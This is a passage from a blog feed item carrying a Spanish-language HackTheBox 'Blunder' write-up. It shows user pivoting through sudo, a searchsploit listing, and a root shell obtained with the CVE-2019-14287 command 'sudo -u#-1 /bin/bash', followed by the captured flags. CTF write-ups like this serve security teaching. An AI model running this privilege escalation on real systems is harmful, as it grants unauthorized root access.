-hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ whoami
-hugo
-hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd /home/hugo/
-hugo@blunder:~$ ls
-Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
-hugo@blunder:~$ cat user.txt 
-0ad6d2d9c835f7f10ba8518d29dedc4b
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Enumerando los privilegios a nivel de &lt;code&gt;sudoers&lt;/code&gt;, vemos que el usario &lt;code&gt;hugo&lt;/code&gt;, puede ejecutar una bash como cualquier usuario a exepción de root. Aprovechando esto podemos migrar al usuario &lt;code&gt;shaun&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hugo@blunder:~$ sudo -u shaun bash
-shaun@blunder:/home/hugo$ whoami
-shaun
-shaun@blunder:/home/hugo$ id
-uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que el usuario &lt;code&gt;shaun&lt;/code&gt;,se encuntra en el grupo &lt;code&gt;lxd&lt;/code&gt;, asi que podriamos aprovecharnos de eso para convertirnos en &lt;code&gt;root&lt;/code&gt;, pero en esta ocasión vamos a realizarlo de otra manera ya que si vemos la version de sudo que se esta empleando corresponde a una vulnerable.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;shaun@blunder:/home/hugo$ sudo --version
-Sudo version 1.8.25p1
-Sudoers policy plugin version 1.8.25p1
-Sudoers file grammar version 46
-Sudoers I/O plugin version 1.8.25p1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Buscando un exploit publico encontramos uno referente a &lt;code&gt;security bypass&lt;/code&gt; y para versiones menores a la 1.8.27, al ser esta una versión menor podemos usar este exploit.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit sudo 1.8.
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-sudo 1.8.0 &amp;lt; 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation                                                               | linux/local/25134.c
-sudo 1.8.0 &amp;lt; 1.8.3p1 - Format String                                                                                                                 | linux/dos/18436.txt
-Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation                                                                     | linux/local/37710.txt
-Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                                                                                     | linux/local/42183.c
-Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                                                                                          | linux/local/48052.sh
-Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                                                                                    | linux/dos/47995.txt
-sudo 1.8.27 - Security Bypass                                                                                                                        | linux/local/47502.py
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Revisamos el codigo del exploit y vemos que solo tenemos que ejecutar la siguiente instrucción &lt;code&gt;sudo -u#-1 /bin/bash&lt;/code&gt;, pero debemos hacerlo como el usuario &lt;code&gt;hugo&lt;/code&gt; ya que este tenia el privilegio a nivel de &lt;code&gt;sudoers&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Una vez ya como el ususario &lt;code&gt;root&lt;/code&gt; nos dirigimos a su directorio personal y visualizamos la segunda flag &lt;code&gt;root.txt.&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hugo@blunder:~$ sudo -u#-1 /bin/bash
-root@blunder:/home/hugo# whoami
-root
-root@blunder:/home/hugo# cd /root
-root@blunder:/root# cat root.txt 
-dd6d458838b1d2c778b789eeb79ab063
-&lt;/code&gt;&lt;/pre&gt;
-
-</description>
-        <pubDate>Wed, 14 Jun 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Blunder</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Blunder</guid>
-        
-        <category>information leaked</category>
-        
-        <category>Bludit CMS explotation</category>
-        
-        <category>bypass IP Blocking (X-Forwarded-For Header)</category>
-        
-        <category>Image File Upload (Playing with .htaccess)</category>
-        
-        <category>Abusing sudo privilege (CVE-2019-14287)</category>
         
         
         <category>hackthebox</category>
